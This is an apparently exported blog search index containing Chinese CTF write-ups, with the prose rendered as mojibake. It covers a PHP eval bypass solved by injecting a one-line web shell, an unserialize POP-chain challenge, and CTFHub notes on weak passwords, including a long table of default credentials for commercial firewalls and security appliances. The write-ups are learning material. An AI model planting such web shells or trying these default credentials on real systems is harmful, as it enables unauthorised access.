<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>æ¯”èµ›é¢˜ç›®wp&amp;æ„Ÿæ‚Ÿè®°å½•</title>
    <url>/2022/06/26/Game-wp/</url>
    <content><![CDATA[<p><u><code>ä»¥ä¸‹æ˜¯æœ¬äººå‡‘äººæ•°å‚åŠ çš„å„ç±»æ¯”èµ›çš„é¢˜ç›®åšé¢˜ç»å†ï¼Œåœ¨æ­¤è®°å½•å­¦ä¹ è¿‡ç¨‹ï¼Œæœ›å¤§ä½¬æŒ‡ç‚¹ä¿®æ­£</code></u></p>
<span id="more"></span>

<h1 id="NewStarCTFå…¬å¼€èµ›"><a href="#NewStarCTFå…¬å¼€èµ›" class="headerlink" title="NewStarCTFå…¬å¼€èµ›"></a>NewStarCTFå…¬å¼€èµ›</h1><h2 id="1-NotPHP"><a href="#1-NotPHP" class="headerlink" title="1.NotPHP"></a>1.NotPHP</h2><p><code>è™½ç„¶æ˜¯åˆ«äººå­¦æ ¡çš„æ–°ç”Ÿèµ›ï¼Œéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è®¸å¤šå€¼å¾—å­¦ä¹ çš„çŸ¥è¯†ç‚¹</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]) == <span class="string">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]) == <span class="number">2077</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hack Me&quot;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Number error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Wrong Key!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Pass it!&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œç»•è¿‡ä¸ç»†è®²ï¼Œéƒ½æ˜¯å¸¸è§çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>ç»†è®²è¿™ä¸ª</p>
<p>è¿™ä¸ªæ˜¯ä¸€ä¸ª<code>eval</code>å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢å…¶å®å·²ç»è¢«<code>#</code>ç»™æ³¨é‡Šæ‰äº†ï¼Œ</p>
<p>æ‰€ä»¥æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ²¡ç»“æœ</p>
<hr>
<p>å› æ­¤éœ€è¦é—­åˆæˆ–è€…ç»•è¿‡<code>#</code></p>
<p>ä½†æ˜¯æˆ‘è¯•äº†å¾ˆå¤šé—­åˆæ–¹å¼ï¼Œç»“æœéƒ½æ²¡ååº”</p>
<p>æœ€åå‘ç°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å®ç°äº†è¯­å¥é—­åˆï¼Œ</p>
<p>ä½†æ˜¯ï¼Œå½“æŠŠè¿™ä¸ªphpç»“å°¾ç¬¦åŠ åˆ°åé¢æ—¶å€™ï¼Œè¿™ä¸ªphpå°±å°±ç»“æŸäº†</p>
<p>ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>

<p>ä¸ºä¾‹å­</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">url/xxx&amp;cmd=?&gt;haha</span><br></pre></td></tr></table></figure></div>

<p>å½“æˆ‘ä»¬é—­åˆäº†phpä»£ç åï¼Œé‚£åé¢çš„<code>haha</code>çš„ä½ç½®åœ¨å“ªé‡Œå‘¢</p>
<p><img src="/2022/06/26/Game-wp/image-20220921083750913.png" alt="image-20220921083750913"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>haha</code>å˜æˆäº†<code>html</code>ä»£ç </p>
<p>é‚£ä¹ˆå°±å¯ä»¥æ“ä½œäº†ï¼Œ</p>
<p>æ¯”å¦‚xssï¼Œä¸€å¥è¯ğŸçš„æ’å…¥ç­‰</p>
<p>xssæˆ‘è¯•äº†ï¼Œæ²¡æœ‰ç»“æœï¼Œç°åœ¨çš„xssåˆ©ç”¨å±‚é¢å’Œå±å®³ä¹Ÿä¸é«˜äº†ï¼ˆå¯èƒ½æ˜¯æˆ‘æŠ€æœ¯ä¸åˆ°ä½ï¼‰</p>
<hr>
<p>æ’å…¥ä¸€å¥è¯ğŸ</p>
<p>å¼€å§‹å› ä¸ºæ˜¯<code>html</code>ï¼Œæˆ‘æ˜¯è¯•äº†<code>jsp</code>ä¸€å¥è¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>ä½†æ˜¯ç”¨èšå‰‘è¿ä¸ä¸Š</p>
<p>æœ€åæŒ‰ç…§ä¼ ç»Ÿæ€è·¯ï¼Œæˆ‘åœ¨åé¢æ’å…¥<code>php</code>ä¸€å¥è¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å¥½å®¶ä¼™ï¼Œä¼ ç»Ÿæ€è·¯ï¼Œæ‰æ˜¯çœŸ</p>
<p>è¿æ¥æˆåŠŸæ‹¿åˆ°<code>flag</code></p>
<hr>
<p>ä¸çŸ¥é“æœ‰æ²¡æœ‰çœ‹åˆ°è¿™ç¯‡æ–‡ç« çš„åŒå­¦çœ‹åˆ°è¿™ä¸ª<code>wp</code>ï¼Œæé†’ä¸€ä¸‹ï¼Œè¿™é‡Œéœ€è¦åœ¨<code>http body</code>é‡Œè¡¥å……<code>num</code>è¯·æ±‚ä¿¡æ¯</p>
<p>å› ä¸ºè¿™ä¹Ÿæ˜¯ç»•è¿‡çš„ä¸€ä¸ªç¯èŠ‚</p>
<p><img src="/2022/06/26/Game-wp/image-20220921084836402.png" alt="image-20220921084836402"></p>
<hr>
<h2 id="2-UnserializeOne"><a href="#2-UnserializeOne" class="headerlink" title="2.UnserializeOne"></a>2.UnserializeOne</h2><p>ä¸€é“<code>popchain</code>ï¼Œè¿™è¿˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åš<code>popchain</code>ç±»ã€æƒ­æ„§ã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
  </entry>
  <entry>
    <title>CTFHub-wp</title>
    <url>/2022/07/27/CTFHub-wp/</url>
    <content><![CDATA[<p><u><code>åšåšç¬”è®°</code></u></p>
<span id="more"></span>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-å¯†ç å£ä»¤"><a href="#1-å¯†ç å£ä»¤" class="headerlink" title="1.å¯†ç å£ä»¤"></a>1.å¯†ç å£ä»¤</h2><h3 id="1ï¼‰å¼±å£ä»¤"><a href="#1ï¼‰å¼±å£ä»¤" class="headerlink" title="1ï¼‰å¼±å£ä»¤"></a>1ï¼‰å¼±å£ä»¤</h3><p>ä¸€èˆ¬æ€ç»´ï¼Œ</p>
<p>ç”¨æˆ·åï¼šadminï¼Œroot</p>
<p>å¯†ç ï¼špasswordï¼Œadmin123ï¼Œ123456</p>
<p>å¯ä»¥ç”¨<strong>top100å­—å…¸</strong>ï¼ˆå¯ä»¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹ï¼‰è·‘ä¸€ä¸‹ï¼Œä½†æœ‰çš„å¯èƒ½éœ€è¦<strong>æšä¸¾æ³•</strong></p>
<p>æ¯”å¦‚<strong>admin888</strong>æˆ–è€…<strong>admin255</strong>è¿™æ ·çš„ç±»ä¼¼çš„ï¼Œå°±éœ€è¦åœ¨åé¢ç”¨æšä¸¾æ³•æ‰¾å‡ºï¼Œå­—å…¸å¹¶æ²¡åŒ…å«è¿™ç§ç±»ä¼¼æƒ…å†µ</p>
<h3 id="2ï¼‰é»˜è®¤å£ä»¤"><a href="#2ï¼‰é»˜è®¤å£ä»¤" class="headerlink" title="2ï¼‰é»˜è®¤å£ä»¤"></a>2ï¼‰é»˜è®¤å£ä»¤</h3><p>å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„å£ä»¤ï¼Œåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯é‡åˆ°å¼±å£ä»¤å¾—åˆ°å…¥å£ä»è€Œæ”»é™·æ•´ä¸ªç³»ç»Ÿï¼Œç”±äºå¾ˆå¤šç³»ç»Ÿç®¡ç†å‘˜ç¼ºå°‘å®‰å…¨æ„è¯†ï¼Œå£ä»¤å¾€å¾€æ˜¯ç³»ç»Ÿé»˜è®¤è®¾ç½®çš„å£ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">å¸¸è§ç½‘ç»œå®‰å…¨è®¾å¤‡å¼±å£ä»¤(é»˜è®¤å£ä»¤)</span><br><span class="line">è®¾å¤‡    é»˜è®¤è´¦å·    é»˜è®¤å¯†ç </span><br><span class="line">æ·±ä¿¡æœäº§å“    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">æ·±ä¿¡æœç§‘æŠ€â€‚AD        dlanrecover</span><br><span class="line">æ·±ä¿¡æœè´Ÿè½½å‡è¡¡ AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœWAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœVPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœAC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">SANGFORé˜²ç«å¢™    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœAF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœNGAFä¸‹ä¸€ä»£åº”ç”¨é˜²ç«å¢™(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœAD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœä¸Šç½‘è¡Œä¸ºç®¡ç†è®¾å¤‡æ•°æ®ä¸­å¿ƒ    <span class="keyword">Admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘å¾¡æ¼æ´æ‰«æç³»ç»Ÿ    leadsec    leadsec</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">ç½‘å¾¡WAFé›†ä¸­æ§åˆ¶ä¸­å¿ƒ(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">è”æƒ³ç½‘å¾¡    administrator    administrator</span><br><span class="line">ç½‘å¾¡äº‹ä»¶æœåŠ¡å™¨    <span class="keyword">admin</span>    admin123</span><br><span class="line">è”æƒ³ç½‘å¾¡é˜²ç«å¢™PowerV    administrator    administrator</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    lenovo    <span class="keyword">default</span></span><br><span class="line">ç½‘ç»œå«å£«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    <span class="keyword">admin</span>    talent</span><br><span class="line">ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸV3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸIDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">ç§‘æ¥ç½‘ç»œå›æº¯åˆ†æç³»ç»Ÿ    csadmin    colasoft</span><br><span class="line">ä¸­æ§è€ƒå‹¤æœºweb3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPathç³»åˆ—    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3Cæ™ºèƒ½ç®¡ç†ä¸­å¿ƒ    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>å¤©æ“    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘ç¥é˜²ç«å¢™    firewall    firewall</span><br><span class="line">å¤©èä¿¡é˜²ç«å¢™NGFW4000    superman    talent</span><br><span class="line">é»‘ç›¾é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">åä¸ºé˜²ç«å¢™    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">æ–¹æ­£é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">é£å¡”é˜²ç«å¢™    <span class="keyword">admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">Juniper_SSG__5é˜²ç«å¢™    netscreen    netscreen</span><br><span class="line">ä¸­æ–°é‡‘ç›¾ç¡¬ä»¶é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">killé˜²ç«å¢™(å† ç¾¤é‡‘è¾°)    <span class="keyword">admin</span>    sys123</span><br><span class="line">å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">é˜¿å§†ç‘ç‰¹é˜²ç«å¢™    <span class="keyword">admin</span>    manager</span><br><span class="line">å±±çŸ³ç½‘ç§‘    hillstone    hillstone</span><br><span class="line">ç»¿ç›Ÿå®‰å…¨å®¡è®¡ç³»ç»Ÿ    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">ç»¿ç›Ÿäº§å“        nsfocus123</span><br><span class="line">TopAuditæ—¥å¿—å®¡è®¡ç³»ç»Ÿ    superman    talent</span><br><span class="line">LogBaseæ—¥å¿—ç®¡ç†ç»¼åˆå®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    safetybase</span><br><span class="line">ç½‘ç¥SecFoxè¿ç»´å®‰å…¨ç®¡ç†ä¸å®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">å¤©èä¿¡æ•°æ®åº“å®¡è®¡ç³»ç»Ÿ    superman    telent</span><br><span class="line">Hillstoneå®‰å…¨å®¡è®¡å¹³å°    hillstone    hillstone</span><br><span class="line">ç½‘åº·æ—¥å¿—ä¸­å¿ƒ    ns25000    ns25000</span><br><span class="line">ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿï¼ˆä¸­ç§‘æ–°ä¸šï¼‰    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">å¤©ç¥ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿ    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">æ˜å¾¡WEBåº”ç”¨é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡æ”»é˜²å®éªŒå®¤å¹³å°    root    <span class="number">123456</span></span><br><span class="line">æ˜å¾¡å®‰å…¨ç½‘å…³    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡è¿ç»´å®¡è®¡ä¸å†Œé£é™©æ§åˆ¶ç³»ç»Ÿ    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">æ˜å¾¡ç½‘ç«™å«å£«    sysmanager    sysmanager888</span><br><span class="line">äº¿é‚®é‚®ä»¶ç½‘å…³    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websenseé‚®ä»¶å®‰å…¨ç½‘å…³    administrator    <span class="keyword">admin</span></span><br><span class="line">æ¢­å­é±¼é‚®ä»¶å­˜å‚¨ç½‘å…³    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br></pre></td></tr></table></figure></div>

<h2 id="2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"><a href="#2-ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½" class="headerlink" title="2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½"></a>2.ä¿¡æ¯æ³„éœ²-å¤‡ä»½æ–‡ä»¶ä¸‹è½½</h2><p><img src="/2022/07/27/CTFHub-wp/image-20220919213733369.png" alt="image-20220919213733369"></p>
<h2 id="2-1-ä¿¡æ¯æ³„éœ²-robots-txt"><a href="#2-1-ä¿¡æ¯æ³„éœ²-robots-txt" class="headerlink" title="2.1 ä¿¡æ¯æ³„éœ²-robots.txt"></a>2.1 ä¿¡æ¯æ³„éœ²-robots.txt</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/robots.txt</span><br></pre></td></tr></table></figure></div>

<p>æŸ¥çœ‹çˆ¬è™«åè®®</p>
<h2 id="2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"><a href="#2-2-ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶" class="headerlink" title="2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶"></a>2.2 ä¿¡æ¯æ³„éœ²-bakæ–‡ä»¶</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">è®¿é—®url/æ–‡ä»¶å.åç¼€å<span class="string">.bak</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½bakï¼ˆå¤‡ä»½æ–‡ä»¶ï¼‰</p>
<h2 id="2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"><a href="#2-3-ä¿¡æ¯æ³„éœ²-vimç¼“å­˜" class="headerlink" title="2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜"></a>2.3 ä¿¡æ¯æ³„éœ²-vimç¼“å­˜</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹</p>
<p>ä»¥ index.php ä¸ºä¾‹ï¼š<br><strong>ç¬¬ä¸€æ¬¡</strong>äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º <code>.index.php.swp</code></p>
<p><strong>å†æ¬¡æ„å¤–é€€å‡º</strong>åï¼Œå°†ä¼šäº§ç”Ÿåä¸º <code>.index.php.swo</code> çš„äº¤æ¢æ–‡ä»¶</p>
<p><strong>ç¬¬ä¸‰æ¬¡äº§ç”Ÿ</strong>çš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º <code>.index.php.swn</code><br>ä½œç”¨</p>
<p><u>å¯ç”¨æ¥æ¢å¤æ„å¤–é€€å‡ºçš„æ–‡ä»¶</u></p>
